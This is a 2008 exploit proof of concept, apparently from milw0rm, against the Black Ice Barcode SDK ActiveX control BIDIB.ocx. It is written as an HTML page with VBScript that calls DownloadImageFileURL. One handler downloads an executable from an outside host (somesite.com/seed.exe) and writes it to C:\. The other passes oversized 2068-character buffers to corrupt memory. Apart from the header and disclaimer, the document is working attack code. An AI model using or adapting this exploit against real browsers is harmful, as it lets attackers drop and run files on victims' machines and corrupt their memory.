@@ -1,0 +1,48 @@
+-----------------------------------------------------------------------------
+ Black Ice Software Inc Barcode SDK (BIDIB.ocx) Arbitrary File Download
+ and Memory Corruption
+ url: http://www.blackice.com
+
+ File : BIDIB.ocx
+ Ver. : 10.9.3.0
+ CLSID: {D2797899-BE27-4CDB-892F-4FDC26EA9BA9}
+
+ Mark.: RegKey Safe for Script: True
+        RegKey Safe for Init: True
+        Implements IObjectSafety: False
+
+ Author: shinnai
+ mail: shinnai[at]autistici[dot]org
+ site: http://shinnai.altervista.org
+
+ This was written for educational purpose. Use it at your own risk.
+ Author will be not responsible for any damage.
+
+ Windows XP Professional SP3 fully patched, with Internet Explorer 7
+ Windows 2k Professional SP3 fully patched, with Internet Explorer 6
+
+ In memory of rgod
+-----------------------------------------------------------------------------
+<object classid='clsid:D2797899-BE27-4CDB-892F-4FDC26EA9BA9' id='test'></object>
+
+<input language=VBScript onclick=tryMe() type=button value='Click here to start the arbitrary file download test'>
+
+<input language=VBScript onclick=MemoryCorruption() type=button value='Click here to start the memory corruption test'>
+
+<script language='vbscript'>
+ Sub tryMe
+  test.DownloadImageFileURL "http://somesite.com/seed.exe", "C:\seed.exe"
+ End Sub
+</script>
+
+<script language='vbscript'>
+ Sub MemoryCorruption
+  buff_0 = String(2068, "A")
+  
+  buff_1 = String(2068, "B")
+  
+  test.DownloadImageFileURL buff_0, buff_1
+ End Sub  
+</script>
+
+# milw0rm.com [2008-06-05]
